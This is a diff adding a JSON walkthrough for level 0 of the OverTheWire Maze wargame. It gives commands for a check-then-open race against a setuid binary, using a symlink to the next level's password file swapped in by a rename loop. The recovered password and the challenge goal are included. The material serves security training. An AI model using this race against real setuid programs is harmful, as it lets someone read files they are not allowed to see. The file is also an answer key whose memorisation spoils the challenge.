@@ -1,0 +1,27 @@
+{
+  "title": "Maze",
+  "host": "maze.labs.overthewire.org",
+  "levels": [
+    {
+      "lvl": 0,
+      "user": "maze0",
+      "cmds": [
+        [
+          "objdump -d /maze/maze0   # main(): access(PATH,R_OK) -> setresuid(euid) -> open(PATH) -> read/print",
+          "# PATH is /tmp/128ecf542a35ac5270a87dc740918404 \u2014 a check-then-open race",
+          "printf 'AAAA...' > /tmp/real_f; ln -s /etc/maze_pass/maze1 /tmp/link_s",
+          "# C loop: rename() the path back and forth between the readable file and the symlink",
+          "for i in $(seq 15000); do /maze/maze0; done | sort | uniq -c"
+        ]
+      ],
+      "out": [
+        "AAAAAAAAAAAAAAAAAAA   (most runs)",
+        "Sp5VmLGFC0            (132 winning runs)"
+      ],
+      "pw": "Sp5VmLGFC0"
+    }
+  ],
+  "goals": {
+    "0": "Race the setuid check-then-open: make access() approve a file you own, then swap in a symlink to the next password before open() runs."
+  }
+}
